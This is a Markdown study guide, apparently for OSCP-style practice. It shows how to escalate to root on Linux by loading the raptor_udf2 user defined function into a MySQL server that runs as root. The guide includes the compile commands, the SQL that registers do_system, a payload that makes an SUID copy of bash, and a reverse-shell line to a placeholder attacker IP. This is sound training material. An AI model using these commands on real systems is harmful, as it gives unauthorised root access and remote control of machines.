# MySQL User Defined Functions (UDF) — Service Exploitation

## Concept — Service Exploits

Some services/daemons run as **root** with relaxed access controls. These are registered and often enabled to run at startup. If you can interact with their console, you can potentially break out to a root shell.

**Common exploitable services:**

| Service Type | Examples |
|---|---|
| Web servers | Apache, Nginx |
| Database servers | MySQL, PostgreSQL |
| Mail servers | Postfix |
| File transfer | vsftpd, proftpd |
| Containers | Docker, Kubernetes |

---

## Why MySQL UDF Exploitation Works

The attack relies on a **combination** of misconfigurations:

```
Unauthenticated MySQL root access
          +
MySQL service running as Linux root
          +
Ability to load a custom UDF
          +
UDF executes system commands
          ↓
Linux root privilege escalation
```

> [!IMPORTANT]
> MySQL `root` (database admin) is **NOT** the same as Linux `root` (system superuser). However, the MySQL **daemon process** (`mysqld`) itself often runs under the Linux `root` user. Commands executed by the service inherit those root privileges.

---

## What is a User Defined Function (UDF)?

MySQL includes built-in functions (`COUNT`, `AVG`, `CONCAT`, `NOW`, etc.). For custom operations, MySQL supports **User Defined Functions** — custom functions written in C/C++, compiled into a shared library, and loaded into the MySQL engine.

- **Linux**: Compiled to a Shared Object (`.so`)
- **Windows**: Compiled to a Dynamic Link Library (`.dll`)

Once imported, executing the UDF triggers compiled C/C++ code **under the privileges of the MySQL daemon** (root).

> [!NOTE]
> The UDF exploit payload is called **`raptor_udf2.c`** — available on Exploit-DB ([ID 1518](https://www.exploit-db.com/exploits/1518)) and bundled with Metasploit. Works on both Linux and Windows.

---

## Attack Chain Overview

```
1. MySQL runs as root         → Service has high privileges
2. Connect without a password → MySQL root account is misconfigured
3. Load a malicious UDF .so   → MySQL loads compiled C code
4. Execute system command      → UDF runs in MySQL process context (root)
5. Root privilege escalation   → Create SUID bash or get reverse shell
```

## Identifying the Vulnerability

```bash
# Check if MySQL is running as root
ps aux | grep mysql | grep root

# Attempt passwordless login
mysql -u root
```

## Compilation — Building the Shared Object

The source file `raptor_udf2.c` must be compiled into a shared library:

```
raptor_udf2.c → raptor_udf2.o → raptor_udf2.so
```

| Extension | Description |
|---|---|
| `.c` | C source code |
| `.o` | Compiled object file |
| `.so` | Shared library that MySQL can load |

### Compile Commands

```bash
# Step 1: Compile C source to object file (position-independent code)
gcc -g -c raptor_udf2.c -fPIC

# Step 2: Link object file into shared object
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

## MySQL UDF Registration — SQL Commands

After logging into MySQL (`mysql -u root`), execute these commands **one by one**:

```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

### Why Use a Table to Transfer the File?

MySQL can read binary data into a `BLOB` column. Direct filesystem writing is restricted from the console, so we use MySQL's own file I/O:

```
Shared library on disk
        ↓
load_file()         → reads binary into MySQL
        ↓
BLOB column         → stores binary in table
        ↓
INTO DUMPFILE       → writes binary to plugin directory
        ↓
MySQL plugin dir    → MySQL can now load it as a UDF
```

## Executing System Commands

Once `do_system` is registered, call it with any shell command:

```sql
-- Method 1: Create SUID rootbash
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');

-- Method 2: Reverse shell
select do_system('bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1');
```

## OSCP-Style Checklist

When you encounter a MySQL service, ask:

- [ ] Can I connect to MySQL?
- [ ] Do I have valid credentials or an empty password?
- [ ] Which Linux user is running the MySQL process?
- [ ] Can the service load plugins or UDFs?
- [ ] Can the resulting function execute system commands?

> [!CAUTION]
> The vulnerability is the **combination** of excessive service privileges and the ability to execute custom code — not simply the fact that MySQL is installed.
